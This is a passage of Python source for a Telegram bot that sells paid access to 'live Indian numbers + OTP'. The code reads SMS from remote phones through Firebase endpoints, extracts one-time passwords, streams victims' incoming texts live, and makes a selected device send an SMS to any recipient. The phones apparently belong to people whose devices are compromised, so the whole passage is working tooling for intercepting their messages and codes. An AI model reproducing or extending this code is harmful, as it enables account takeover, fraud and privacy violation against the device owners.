    return ""

def msg_sender(m):
    for key in ("sender", "from", "address", "number", "phone", "phoneNumber",
                "mobile", "mobNo", "src", "originator", "senderNumber", "fromNumber"):
        v = m.get(key)
        if v is not None and str(v).strip():
            return str(v).strip()
    return "SMS"

def msg_otp(body):
    if not body:
        return ""
    text = str(body).replace("​", " ").replace("\u00a0", " ")
    for pat in (r'\b(?:OTP|code|verification|verify|login|passcode)\D{0,20}(\d{4,8})\b',
                r'\b(\d{4,8})\b\D{0,20}(?:OTP|code|verification|verify|login)\b',
                r'#(\d{4,8})\b'):
        m = re.search(pat, text, re.IGNORECASE)
        if m and m.group(1).isdigit():
            return m.group(1)
    if re.search(r"otp|password|code|pin", text, re.IGNORECASE):
        m = re.search(r"\b(\d{4,8})\b", text)
        if m:
            return m.group(1)
    return ""

_DT_FMTS = ("%d-%m-%Y | %I:%M %p", "%d-%m-%Y %I:%M %p", "%Y-%m-%d %H:%M:%S",
            "%d/%m/%Y %H:%M:%S")

def msg_epoch(m, key):
    for k in ("time", "timestamp", "date", "dateTime", "receivedTime", "received_at", "sentTime", "createdAt"):
        v = m.get(k)
        if v is None:
            continue
        s = str(v).strip()
        if re.fullmatch(r"\d{10,15}", s):
            n = int(s)
            if n > 10**12: n //= 1000
            if n > 10**9:
                return n
        for f in _DT_FMTS:
            try:
                return int(datetime.strptime(s, f).replace(tzinfo=IST).timestamp())
            except ValueError:
                pass
    s = str(key)
    if re.fullmatch(r"\d{10,15}", s):
        n = int(s)
        if n > 10**12: n //= 1000
        if n > 10**9:
            return n
    return 0

def fmt_ist(epoch):
    if not epoch:
        return "—"
    return datetime.fromtimestamp(epoch, IST).strftime("%d-%m %H:%M:%S") + " IST"

def msg_time_str(m, key):
    for k in ("time", "timestamp", "date", "dateTime", "receivedTime", "received_at", "sentTime", "createdAt"):
        v = m.get(k)
        if v is not None and str(v).strip():
            s = str(v).strip()
            if re.fullmatch(r"\d{10,15}", s):
                n = int(s)
                if n > 10**12: n //= 1000
                if n > 10**9:
                    return datetime.fromtimestamp(n, IST).strftime("%d-%m %H:%M:%S") + " IST"
                return s[:40]
            return s[:40]
    return fmt_ist(msg_epoch(m, key))

def fmt_phone(p):
    return f"+91 {p[:5]} {p[5:]}"

learned_ts = {}

def learn_ts(url, cid, msgs):
    if msgs:
        e = msg_epoch(msgs[0][1], msgs[0][0])
        if e:
            learned_ts[(url, str(cid))] = max(learned_ts.get((url, str(cid)), 0), e)

_PHONE_PAT = re.compile(r'(?:\+91|91|0)?([6-9]\d{9})')

def extract_phone_from_msgs(msgs):
    from collections import Counter
    counts = Counter()
    for k, m in msgs:
        if not isinstance(m, dict):
            continue
        for num in _PHONE_PAT.findall(msg_body(m)):
            d = re.sub(r"\D", "", num)
            if len(d) == 10 and d[0] in "6789":
                counts[d] += 1
    return counts.most_common(1)[0][0] if counts else ""

def sms_line(m, key):
    body = msg_body(m)
    sender = msg_sender(m)[:16]
    otp = msg_otp(body)
    t = msg_time_str(m, key)
    if otp:
        return f"[{esc(sender)}] ▪ ᴏᴛᴘ: <code>{esc(otp)}</code>\nᴛɪᴍᴇ: {esc(t)}"
    return f"[{esc(sender)}] {esc(body[:70])}\nᴛɪᴍᴇ: {esc(t)}"

def sms_block(m, key):
    body = msg_body(m)
    sender = msg_sender(m)[:20]
    otp = msg_otp(body)
    t = msg_time_str(m, key)
    head = f"[{esc(sender)}]" + (f" ▪ ᴏᴛᴘ: <code>{esc(otp)}</code>" if otp else "")
    return (f"▪ <b>{head}</b>\n"
            f"<blockquote>{esc(body) if body else '—'}</blockquote>\n"
            f"ᴛɪᴍᴇ: {esc(t)}")

# ══════════════════════════════════════════════════════════════
#  VIDEO ROTATION
# ══════════════════════════════════════════════════════════════

_vlock = threading.RLock()
_vids = {}

def _save_vids():
    with _vlock:
        DATA.mkdir(exist_ok=True)
        (DATA / "video_ids.json").write_text(json.dumps(_vids), encoding="utf-8")

def send_video(cid, caption, kb=None):
    try:
        vids = [p for p in sorted(VIDEO_DIR.glob("*.mp4")) if p.stat().st_size > 50000]
    except Exception:
        vids = []
    if not vids:
        return send(cid, caption, kb)
    p = random.choice(vids)
    with _vlock:
        fid = _vids.get(p.name)
    if fid:
        return api("sendVideo", chat_id=cid, video=fid, caption=caption,
                   parse_mode="HTML", supports_streaming=True, reply_markup=kb)
    try:
        with open(p, "rb") as f:
            r = sess.post(f"{TG}/sendVideo",
                          data={"chat_id": cid, "caption": caption, "parse_mode": "HTML",
                                "supports_streaming": "true",
                                "reply_markup": json.dumps(kb) if kb else None},
                          files={"video": (p.name, f)}, timeout=180)
        j = r.json()
        if j.get("ok"):
            with _vlock:
                _vids[p.name] = j["result"]["video"]["file_id"]
            threading.Thread(target=_save_vids, daemon=True).start()
            return j
    except Exception as e:
        log.warning(f"sendVideo {p.name}: {e}")
    return send(cid, caption, kb)

# ══════════════════════════════════════════════════════════════
#  DEVICE STATE
# ══════════════════════════════════════════════════════════════

state = {}
mode = {}
page_cache = {}
num_assign = {}
_nlock = threading.RLock()
OCCUPY_SECS = 900

def release_user_nums(uid):
    uid = str(uid)
    with _nlock:
        dead = [k for k, v in num_assign.items() if v.get("uid") == uid]
        for k in dead:
            del num_assign[k]

def claim_device(uid, d):
    uid = str(uid)
    release_user_nums(uid)
    with _nlock:
        num_assign[f"{d['url']}|{d['cid']}"] = {"uid": uid, "ts": time.time(), "phone": d.get("phone", "")}

def is_taken(d, uid):
    uid = str(uid)
    now = time.time()
    with _nlock:
        for k, v in num_assign.items():
            if v.get("uid") == uid or now - v.get("ts", 0) > OCCUPY_SECS:
                continue
            if k == f"{d['url']}|{d['cid']}" or (v.get("phone") and v.get("phone") == d.get("phone")):
                return True, v.get("ts", 0)
    return False, 0

# ══════════════════════════════════════════════════════════════
#  CUSTOM SMS MODULE  (NEW — fully isolated, does not touch old flow)
# ══════════════════════════════════════════════════════════════

csm_sessions = {}
csm_lock = threading.RLock()

def csm_validate_recipient(raw):
    d = re.sub(r"\D", "", str(raw or ""))
    if len(d) == 12 and d.startswith("91"):
        d = d[2:]
    elif len(d) == 11 and d.startswith("0"):
        d = d[1:]
    return d if len(d) == 10 and d[0] in "6789" else ""

def csm_start(cid, uid, u, mid=None):
    uid = str(uid)
    if not has_access(uid):
        access_required_page(cid, uid, mid)
        return
    d = (state.get(uid) or {}).get("dev")
    if not d:
        send(cid, "❌ No device selected. Go back and pick a device.",
             buttons([[b_back()]]))
        return
    if not d.get("online"):
        send(cid, f"{sec('❌', 'ᴅᴇᴠɪᴄᴇ ᴏꜰꜰʟɪɴᴇ')}\n{DIV}\n\n"
                  f"{emo('📱')} <code>{fmt_phone(d['phone'])}</code> is not online right now.\n"
                  f"Try another device." + footer(),
                 buttons([[btn("ɴᴇᴡ ɴᴜᴍʙᴇʀ", "dev_new", style="primary")], [b_back()]]))
        return
    with csm_lock:
        old = csm_sessions.get(uid)
        if old and old.get("step") == "executing":
            send(cid, "⚠️ A Custom SMS request is already in progress. Wait for the result.",
                 buttons([[b_back()]]))
            return
        csm_sessions[uid] = {
            "url": d["url"],
            "cid": d["cid"],
            "phone": d["phone"],
            "name": d.get("name", ""),
            "online": bool(d.get("online")),
            "recipient": "",
            "step": "await_recipient",
            "request_id": "",
            "started_at": time.time(),
        }
    mode[uid] = "csm_await_recipient"

    txt = (f"{sec('📩', 'ᴄᴜꜱᴛᴏᴍ sᴍꜱ — sᴛᴇᴘ 1/2')}\n{DIV}\n\n"
           f"{emo('📱')} <b>ᴅᴇᴠɪᴄᴇ:</b> <code>{fmt_phone(d['phone'])}</code>\n\n"
           f"{emo('📞')} <b>sᴇɴᴅ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ</b>\n\n"
           f"<blockquote>Enter the <b>10-digit recipient mobile number</b> where the verification SMS will be delivered.\n\n"
           f"Example: <code>9876543210</code></blockquote>" + footer())
    kb = buttons([[btn("❌ ᴄᴀɴᴄᴇʟ", "csm_cancel", style="danger")]])
    if mid: edit(cid, mid, txt, kb)
    else:   send(cid, txt, kb)

def csm_receive_recipient(cid, uid, text):
    uid = str(uid)
    with csm_lock:
        s = csm_sessions.get(uid)
        if not s or s.get("step") != "await_recipient":
            return
        if time.time() - s.get("started_at", 0) > CSM_SESSION_TTL:
            csm_sessions.pop(uid, None)
            mode.pop(uid, None)
            send(cid, f"{sec('⏳', 'ꜱᴇꜱꜱɪᴏɴ ᴇxᴘɪʀᴇᴅ')}\n{DIV}\n\nStart again." + footer(),
                 buttons([[b_back()]]))
            return
        valid = csm_validate_recipient(text)
        if not valid:
            send(cid, f"{sec('❌', 'ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ')}\n{DIV}\n\n"
                      f"Send a valid 10-digit Indian mobile number starting with 6-9.\n"
                      f"Example: <code>9876543210</code>" + footer(),
                 buttons([[btn("❌ ᴄᴀɴᴄᴇʟ", "csm_cancel", style="danger")]]))
            mode[uid] = "csm_await_recipient"
            return
        s["recipient"] = valid
        s["step"] = "await_confirm"

    txt = (f"{sec('📩', 'ᴄᴜꜱᴛᴏᴍ sᴍꜱ — sᴛᴇᴘ 2/2')}\n{DIV}\n\n"
           f"{emo('📱')} <b>ꜰʀᴏᴍ ᴅᴇᴠɪᴄᴇ:</b> <code>{fmt_phone(s['phone'])}</code>\n"
           f"{emo('📞')} <b>ᴛᴏ ɴᴜᴍʙᴇʀ:</b> <code>{fmt_phone(valid)}</code>\n\n"
           f"<blockquote>{emo('💬')} <b>ᴍᴇꜱꜱᴀɢᴇ ᴛᴏ ꜱᴇɴᴅ:</b>\n"
           f"<i>{esc(CSM_MSG_TEXT)}</i></blockquote>\n\n"
           f"{emo('⚠️')} This will send <b>one</b> verification SMS from the above device. Confirm to proceed." + footer())
    kb = buttons([
        [btn("✅ ᴄᴏɴꜰɪʀᴍ & sᴇɴᴅ", "csm_confirm_send", style="success")],
        [btn("❌ ᴄᴀɴᴄᴇʟ", "csm_cancel", style="danger")],
    ])
    send(cid, txt, kb)

def csm_execute(cid, uid, u, qid, mid=None):
    uid = str(uid)
    with csm_lock:
        s = csm_sessions.get(uid)
        if not s or s.get("step") != "await_confirm":
            answer_cb(qid, "Session expired — start again.", alert=True)
            return
        s["step"] = "executing"
        s["request_id"] = uuid.uuid4().hex[:12]
        recipient = s["recipient"]
        url_base = s["url"]
        cid_dev  = s["cid"]
        phone    = s["phone"]
        online   = s["online"]
        req_id   = s["request_id"]

    if not online:
        with csm_lock:
            csm_sessions.pop(uid, None)
        edit(cid, mid,
             f"{sec('❌', 'sᴍꜱ ꜰᴀɪʟᴇᴅ')}\n{DIV}\n\n"
             f"{emo('📱')} Selected device went offline.\n"
             f"{emo('👉')} Pick another device and try again." + footer(),
             buttons([[btn("ɴᴇᴡ ɴᴜᴍʙᴇʀ", "dev_new", style="primary")], [b_back()]]))
        answer_cb(qid, "Device offline", alert=True)
        return

    answer_cb(qid, "Sending…")

    path = f"clients/{cid_dev}/webhookEvent/{req_id}"
    payload = {
        "sim": "0",
        "to": recipient,
        "message": CSM_MSG_TEXT,
        "isSended": False,
        "createdAt": int(time.time() * 1000),
    }
    write_ok = False
    write_err = ""
    try:
        fb_url = f"{url_base.rstrip('/')}/{path}.json"
        r = sess.put(fb_url, json=payload, timeout=12)
        if r.status_code in (200, 201):
            write_ok = True
        else:
            write_err = f"HTTP {r.status_code}"
    except Exception as e:
        write_err = type(e).__name__

    if not write_ok:
        with csm_lock:
            csm_sessions.pop(uid, None)
        edit(cid, mid,
             f"{sec('❌', 'sᴍꜱ ꜰᴀɪʟᴇᴅ')}\n{DIV}\n\n"
             f"{emo('⚠️')} Could not queue the SMS on the device.\n"
             f"<code>{esc(write_err or 'write failed')}</code>\n\n"
             f"{emo('👉')} Try again with a different device." + footer(),
             buttons([[btn("ɴᴇᴡ ɴᴜᴍʙᴇʀ", "dev_new", style="primary")], [b_back()]]))
        log.warning(f"csm write failed for {uid} on {cid_dev}: {write_err}")
        return

    edit(cid, mid,
         f"{sec('⏳', 'ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴀᴄᴋ')}\n{DIV}\n\n"
         f"{emo('📱')} <b>ᴅᴇᴠɪᴄᴇ:</b> <code>{fmt_phone(phone)}</code>\n"
         f"{emo('📞')} <b>ᴛᴏ:</b> <code>{fmt_phone(recipient)}</code>\n\n"
         f"<blockquote>{emo('⚡', 'bolt')} Request queued on device. Waiting for delivery acknowledgement...</blockquote>"
         + footer(),
         buttons([[btn("❌ ᴄᴀɴᴄᴇʟ", "csm_cancel", style="danger")]]))

    threading.Thread(target=csm_ack_poller,
                     args=(uid, req_id, url_base, cid_dev, phone, recipient, cid, mid),
                     daemon=True).start()

def csm_ack_poller(uid, req_id, url_base, cid_dev, phone, recipient, cid, mid):
    deadline = time.time() + CSM_ACK_TIMEOUT
    while time.time() < deadline:
        with csm_lock:
            cur = csm_sessions.get(uid)
            if not cur or cur.get("request_id") != req_id:
                return
        time.sleep(CSM_ACK_POLL_SECS)
        try:
            path = f"clients/{cid_dev}/webhookEvent/{req_id}/isSended"
            val, err = fb_get(url_base, path, timeout=6)
            if val is True:
                with csm_lock:
                    cur = csm_sessions.get(uid)
                    if not cur or cur.get("request_id") != req_id:
                        return
                    csm_sessions.pop(uid, None)
                edit(cid, mid,
                     f"{sec('✅', 'sᴍꜱ sᴇɴᴛ')}\n{DIV}\n\n"
                     f"{emo('📱')} <b>ꜰʀᴏᴍ:</b> <code>{fmt_phone(phone)}</code>\n"
                     f"{emo('📞')} <b>ᴛᴏ:</b> <code>{fmt_phone(recipient)}</code>\n"
                     f"{emo('✅')} <b>sᴛᴀᴛᴜꜱ:</b> sᴍꜱ sᴇɴᴛ ✅\n"
                     f"{emo('⏳')} <b>ᴀᴄᴋ ᴛɪᴍᴇ:</b> {fmt_ist(time.time())}" + footer(),
                     buttons([[b_back()]]))
                return
        except Exception as e:
            log.warning(f"csm ack poll {uid}: {e}")

    with csm_lock:
        cur = csm_sessions.get(uid)
        if not cur or cur.get("request_id") != req_id:
            return
        csm_sessions.pop(uid, None)
    edit(cid, mid,
         f"{sec('❌', 'sᴍꜱ ꜰᴀɪʟᴇᴅ')}\n{DIV}\n\n"
         f"{emo('📱')} <b>ꜰʀᴏᴍ:</b> <code>{fmt_phone(phone)}</code>\n"
         f"{emo('📞')} <b>ᴛᴏ:</b> <code>{fmt_phone(recipient)}</code>\n"
         f"{emo('❌')} <b>sᴛᴀᴛᴜꜱ:</b> sᴍꜱ ꜰᴀɪʟᴇᴅ ❌\n"
         f"{emo('⚠️')} Device did not acknowledge within {CSM_ACK_TIMEOUT}s." + footer(),
         buttons([[b_back()]]))

def csm_cancel(cid, uid, u, qid, mid=None):
    uid = str(uid)
    with csm_lock:
        csm_sessions.pop(uid, None)
    mode.pop(uid, None)
    answer_cb(qid, "Cancelled")
    d = (state.get(uid) or {}).get("dev")
    if d:
        txt, kb = dev_card(d)
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
    else:
        send_home(cid, uid, u)

# ══════════════════════════════════════════════════════════════
#  DEVICE CARD  (only change: one extra button row for Custom SMS)
# ══════════════════════════════════════════════════════════════

def dev_card(d, title="ʏᴏᴜʀ ɴᴜᴍʙᴇʀ"):
    msgs = fetch_msgs(d["url"], d["cid"], 3)
    learn_ts(d["url"], d["cid"], msgs)
    last = sms_line(msgs[0][1], msgs[0][0]) if msgs else "ɴᴏ ꜱᴍꜱ ʏᴇᴛ"
    dot = "🟢" if d["online"] else "🔴"
    txt = (f"{sec('📞', title)}\n{DIV}\n\n"
           f"<blockquote>{emo('📞')} <b>ɴᴜᴍʙᴇʀ:</b> <code>{fmt_phone(d['phone'])}</code>\n"
           f"{dot} <b>ꜱᴛᴀᴛᴜꜱ:</b> {'ᴀᴄᴛɪᴠᴇ' if d['online'] else 'ɪᴅʟᴇ'}\n"
           f"{emo('📱')} <b>ᴅᴇᴠɪᴄᴇ:</b> {esc(d['name'][:20])}\n\n"
           f"▪ <b>ʟᴀꜱᴛ ꜱᴍꜱ</b>\n{last}</blockquote>" + footer())
    kb = buttons([
        [btn("ɴᴇᴡ ɴᴜᴍʙᴇʀ", "dev_new", style="success"),
         btn("ʀᴇꜰʀᴇsʜ", "dev_refresh", style="primary")],
        [btn("sᴍs ʜɪsᴛᴏʀʏ", "dev_hist", style="primary"),
         btn("ᴡᴀᴛᴄʜ sᴍꜱ ʟɪᴠᴇ", "dev_live", style="success")],
        [btn("📩 ᴄᴜꜱᴛᴏᴍ sᴍꜱ", "csm_start", style="success")],
        [b_back()]])
    return txt, kb

def get_number(cid, uid, mid=None):
    if not has_access(uid):
        access_required_page(cid, uid, mid)
        return
    ensure_user_fbs(uid)
    idx = devices_index(uid)
    online = [d for d in idx if d["online"]]
    if not online:
        txt = f"{sec('👻', 'ɴᴏ ᴅᴇᴠɪᴄᴇꜱ ᴏɴʟɪɴᴇ')}\n{DIV}\n\nᴛʀʏ ᴀɢᴀɪɴ ɪɴ ᴀ ᴍɪɴᴜᴛᴇ." + footer()
        kb = buttons([[btn("ʀᴇᴛʀʏ", "getnum", style="primary")], [b_back()]])
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
        return
    withphone = [d for d in online if d["phone"]]
    if not withphone:
        def resolve(d):
            msgs = fetch_msgs(d["url"], d["cid"], 5)
            learn_ts(d["url"], d["cid"], msgs)
            p = extract_phone_from_msgs(msgs)
            if p:
                d["phone"] = p
                return d
            return None
        pool = random.sample(online, min(12, len(online)))
        withphone = [d for d in JOB_POOL.map(resolve, pool) if d]
    if not withphone:
        txt = f"{sec('👻', 'ɴᴏ ɴᴜᴍʙᴇʀꜱ ᴀᴠᴀɪʟᴀʙʟᴇ')}\n{DIV}\n\nᴛʀʏ ᴀɢᴀɪɴ ɪɴ ᴀ ᴍɪɴᴜᴛᴇ." + footer()
        kb = buttons([[btn("ʀᴇᴛʀʏ", "getnum", style="primary")], [b_back()]])
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
        return
    random.shuffle(withphone)
    def best(d):
        msgs = fetch_msgs(d["url"], d["cid"], 1)
        learn_ts(d["url"], d["cid"], msgs)
        return (msg_epoch(msgs[0][1], msgs[0][0]) if msgs else 0, d)
    scored = list(JOB_POOL.map(best, withphone[:36]))
    scored.sort(key=lambda x: -x[0])
    pick = None
    for ep, d in scored:
        taken, ts = is_taken(d, uid)
        if not taken:
            pick = d
            break
    if not pick and scored:
        pick = scored[0][1]
    if not pick:
        txt = f"{sec('👻', 'ɴᴏ ɴᴜᴍʙᴇʀꜱ ᴀᴠᴀɪʟᴀʙʟᴇ')}\n{DIV}\n\nᴛʀʏ ᴀɢᴀɪɴ ɪɴ ᴀ ᴍɪɴᴜᴛᴇ." + footer()
        kb = buttons([[btn("ʀᴇᴛʀʏ", "getnum", style="primary")], [b_back()]])
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
        return
    claim_device(uid, pick)
    state.setdefault(str(uid), {})["dev"] = pick
    txt, kb = dev_card(pick)
    if mid: edit(cid, mid, txt, kb)
    else:   send(cid, txt, kb)

def active_card(uid, page):
    if not has_access(uid):
        return None, None
    snap = page_cache.get(uid)
    now = time.time()
    if not snap or now - snap["t"] > 180:
        idx = devices_index(uid)
        idx.sort(key=lambda d: (0 if d["online"] else 1,
                                -learned_ts.get((d["url"], d["cid"]), 0), d["phone"]))
        snap = {"list": idx, "t": now}
        if len(page_cache) > 400:
            page_cache.clear()
        page_cache[uid] = snap
    lst = snap["list"]
    total = len(lst)
    hot = sum(1 for d in lst if d["online"])
    pages = max(1, (total + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    chunk = lst[page * PAGE_SIZE:(page + 1) * PAGE_SIZE]
    lines = []
    for i, d in enumerate(chunk, page * PAGE_SIZE + 1):
        dot = "🟢" if d["online"] else "🔴"
        lines.append(f"{dot} {i}. <code>{fmt_phone(d['phone'])}</code>")
    body = "\n".join(lines) if lines else "ᴇᴍᴘᴛʏ — ɴᴏ ᴅᴇᴠɪᴄᴇs ꜰᴏᴜɴᴅ."
    txt = (f"{sec('🟢', 'ᴀᴄᴛɪᴠᴇ ɴᴜᴍʙᴇʀꜱ')}\n{DIV}\n\n"
           f"ᴛᴏᴛᴀʟ: <b>{total}</b>  ·  ʜᴏᴛ: <b>{hot}</b>  ·  ᴘᴀɢᴇ {page + 1}/{pages}\n\n"
           f"{body}" + footer())
    num_rows = []
    row = []
    for i, d in enumerate(chunk):
        row.append(btn(d["phone"][-4:], f"num_{page * PAGE_SIZE + i}",
                       style="success" if d["online"] else "danger"))
        if len(row) == 2:
            num_rows.append(row)
            row = []
    if row:
        num_rows.append(row)
    nav = []
    if page > 0:
        nav.append(btn("◀️", f"act_{page - 1}", style="primary"))
    nav.append(btn(f"📄 {page + 1}/{pages}", "noop", style="primary"))
    if page < pages - 1:
        nav.append(btn("▶️", f"act_{page + 1}", style="primary"))
    num_rows.append(nav)
    num_rows.append([btn("ʀᴇꜰʀᴇsʜ", "act_refresh", style="success"), b_back()])
    return txt, buttons(num_rows)

def live_watcher(cid, uid):
    st = state.get(uid) or {}
    d = st.get("dev")
    if not d:
        return
    st["live_stop"] = False
    m = send(cid, f"{sec('🔴', 'ʟɪᴠᴇ sᴍs — ' + fmt_phone(d['phone']))}\n{DIV}\n\n"
                  f"{emo('⚡', 'bolt')} ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴅᴇᴠɪᴄᴇ...")
    if not (m and m.get("ok")):
        return
    mid = m["result"]["message_id"]
    top_key = None
    last_txt = None
    end = time.time() + LIVE_SECS
    kb = buttons([[btn("sᴛᴏᴘ", "live_stop", style="danger")], [b_back()]])
    while time.time() < end:
        if st.get("live_stop"):
            return
        try:
            msgs = fetch_msgs(d["url"], d["cid"], 3)
            learn_ts(d["url"], d["cid"], msgs)
            if msgs and msgs[0][0] != top_key:
                top_key = msgs[0][0]
                lines = "\n\n".join(sms_block(x[1], x[0]) for x in msgs[:3])
                txt = f"{sec('🔴', 'ʟɪᴠᴇ sᴍs — ' + fmt_phone(d['phone']))}\n{DIV}\n\n{lines}{footer()}"
            elif not msgs:
                txt = f"{sec('🔴', 'ʟɪᴠᴇ sᴍs — ' + fmt_phone(d['phone']))}\n{DIV}\n\nᴡᴀɪᴛɪɴɢ ꜰᴏʀ ɴᴇᴡ ꜱᴍꜱ...{footer()}"
            else:
                txt = None
            if txt and txt != last_txt:
                last_txt = txt
                edit(cid, mid, txt, kb)
        except Exception:
            log.exception("live watcher")
        time.sleep(2.5)
    edit(cid, mid, f"{sec('🔴', 'ʟɪᴠᴇ ᴇɴᴅᴇᴅ — ' + fmt_phone(d['phone']))}\n{DIV}\n\n"
                   f"{emo('⚡', 'bolt')} ᴡᴀᴛᴄʜ ꜱᴇꜱꜱɪᴏɴ ꜰɪɴɪꜱʜᴇᴅ.{footer()}",
         buttons([[btn("ʀᴇꜱᴛᴀʀᴛ ʟɪᴠᴇ", "dev_live", style="success")], [b_back()]]))

# ══════════════════════════════════════════════════════════════
#  UI PAGES
# ══════════════════════════════════════════════════════════════

def access_required_page(cid, uid, mid=None):
    u = get_user_cached(uid)
    credits = u.get("credits", 0)
    rem = get_access_remaining(uid)
    access_status = "EXPIRED" if rem <= 0 else fmt_remaining(rem)

    txt = (
        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"⚡ <b>RTF GAMMING</b>\n"
        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
        f"┌─────────────────────────┐\n"
        f"│ {emo('🔒')}  <b>Access Required</b>\n"
        f"└─────────────────────────┘\n\n"
        f"{emo('💰')} <b>Your Credits:</b> {credits}\n"
        f"{emo('⚡', 'bolt')} <b>Access:</b> {access_status}\n\n"
        f"<b>1 Credit = 1 Hour Access</b>\n\n"
        f"<b>Select hours to unlock:</b>\n\n"
        f"{emo('👨‍💻')} Dev: <a href='https://t.me/RTFGAMMING'>@RTFGAMMING</a> | "
        f"{emo('🤖')} Bot: <a href='https://t.me/RTF_OTP'>@RTF_OTP</a>"
    )

    rows = []
    if credits > 0:
        row1 = []
        for h in [1, 2, 3, 6]:
            if h <= credits:
                row1.append(btn(f"{h}h", f"buy_access_{h}", style="success"))
        if row1:
            rows.append(row1)
        row2 = []
        for h in [12, 24]:
            if h <= credits:
                row2.append(btn(f"{h}h", f"buy_access_{h}", style="success"))
        if row2:
            rows.append(row2)

    rows.append([btn("BUY CREDITS", "buy_credits", style="success")])
    rows.append([b_back("back")])

    if mid:
        edit(cid, mid, txt, buttons(rows))
    else:
        send(cid, txt, buttons(rows))

def buy_credits_page(cid, mid=None):
    txt = (
        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"<b>BUY CREDITS</b>\n"
        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
        f"Choose a package:\n\n"
        f"<b>10 Credits — ₹10</b>\n"
        f"   └ 10 hours of access\n\n"
        f"<b>1 Day Unlimited — ₹20</b>\n"
        f"   └ 24 hours unlimited access\n\n"
        f"<b>Lifetime — ₹200</b>\n"
        f"   └ Never expires\n\n"
        f"<b>Payment:</b> Pay via UPI/QR\n"
        f"After payment, send screenshot here — admin will verify.\n\n"
        f"<b>Note:</b> Credits added manually by admin."
    )
    rows = [
        [btn("10 Credits — ₹10", "buy_pay_pkg_10c", style="primary")],
        [btn("1 Day Unlimited — ₹20", "buy_pay_pkg_1d", style="primary")],
        [btn("Lifetime — ₹200", "buy_pay_pkg_life", style="success")],
        [b_back()],
    ]
    if mid:
        edit(cid, mid, txt, buttons(rows))
    else:
        send(cid, txt, buttons(rows))

def welcome_text(uid, u):
    d = get_user_cached(uid)
    un = f"@{u.get('username')}" if u.get("username") else "—"
    rem = get_access_remaining(uid)
    credits = d.get("credits", 0)
    access_str = "UNLIMITED ♾️" if rem < 0 else (fmt_remaining(rem) if rem > 0 else "EXPIRED ❌")
    return (
        f"{sec('🔥', 'ᴡᴇʟᴄᴏᴍᴇ')}\n{DIV}\n\n"
        f"{emo('👤', 'user')} <b>ɴᴀᴍᴇ:</b> {esc(u.get('first_name') or '—')}\n"
        f"{emo('🔗', 'link')} <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {esc(un)}\n"
        f"{emo('🆔')} <b>ɪᴅ:</b> <code>{uid}</code>\n"
        f"{emo('💰')} <b>Credits:</b> {credits}\n"
        f"{emo('⚡', 'bolt')} <b>Access:</b> {access_str}\n"
        f"{emo('🤝', 'hand')} <b>ʀᴇꜰᴇʀs:</b> {len(d.get('refs', []))}\n\n"
        f"<blockquote>{emo('📱')} ʟɪᴠᴇ ɪɴᴅɪᴀɴ ɴᴜᴍʙᴇʀs + ᴏᴛᴘ\n"
        f"{emo('⚡', 'bolt')} 1 ʀᴇꜰᴇʀ = 1 ᴄʀᴇᴅɪᴛ = 1 ʜᴏᴜʀ\n"
        f"{emo('👉')} ᴄʜᴏᴏꜱᴇ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ</blockquote>"
    )

def home_kb(uid):
    rows = [
        [btn("ꜰɪɴᴅ ɴᴜᴍʙᴇʀ", "getnum", style="primary"),
         btn("ꜱᴇᴀʀᴄʜ ɴᴜᴍʙᴇʀ", "search", style="primary")],
        [btn("ᴀᴄᴛɪᴠᴇ ɴᴜᴍʙᴇʀꜱ", "act", style="primary"),
         btn("ʀᴇꜰᴇʀ ᴀɴᴅ ᴇᴀʀɴ", "refer", style="success")],
        [btn("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ", "addfb", style="success"),
         btn("ʜᴇʟᴘ", "help", style="primary")],
    ]
    if is_adm(uid):
        rows.append([btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "adm", style="danger")])

    credits = get_user_cached(uid).get("credits", 0)
    rows.append([btn(f"BUY CREDITS ({credits} credits)", "buy_credits", style="success")])

    return buttons(rows)

def send_home(cid, uid, u):
    update_user_db(uid, {"welcome_shown": True})
    send_video(cid, welcome_text(uid, u), home_kb(uid))

# ══════════════════════════════════════════════════════════════
#  REFERRAL PAGES
# ══════════════════════════════════════════════════════════════

def refer_card(uid):
    d = get_user_cached(uid)
    link = f"https://t.me/{BOT_UN}?start=ref_{uid}"
    txt = (f"{sec('🤝', 'ʀᴇꜰᴇʀ ᴀɴᴅ ᴇᴀʀɴ')}\n{DIV}\n\n"
           f"<blockquote>{emo('🚀', 'rocket')} ꜱʜᴀʀᴇ ʏᴏᴜʀ ʟɪɴᴋ — <b>1 ʀᴇꜰᴇʀ = 1 ᴄʀᴇᴅɪᴛ</b>\n"
           f"{emo('⚡', 'bolt')} 1 ᴄʀᴇᴅɪᴛ = <b>1 ʜᴏᴜʀ ᴀᴄᴄᴇꜱꜱ</b>\n"
           f"{emo('👑', 'crown')} ᴄʟɪᴍʙ ᴛʜᴇ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ!</blockquote>\n\n"
           f"{emo('🔗', 'link')} <b>ʏᴏᴜʀ ʟɪɴᴋ:</b>\n<code>{link}</code>\n\n"
           f"{emo('💰')} <b>ʏᴏᴜʀ ᴄʀᴇᴅɪᴛs:</b> {d.get('credits', 0)}\n"
           f"{emo('👤', 'user')} <b>ʏᴏᴜʀ ʀᴇꜰᴇʀs:</b> {len(d.get('refs', []))}" + footer())
    kb = buttons([
        [btn("sʜᴀʀᴇ ʟɪɴᴋ", None, url=f"https://t.me/share/url?url={quote(link, safe='')}", style="success")],
        [b_back()]])
    return txt, kb

def help_card(cid):
    txt = (f"{sec('❓', 'ʜᴇʟᴘ')}\n{DIV}\n\n"
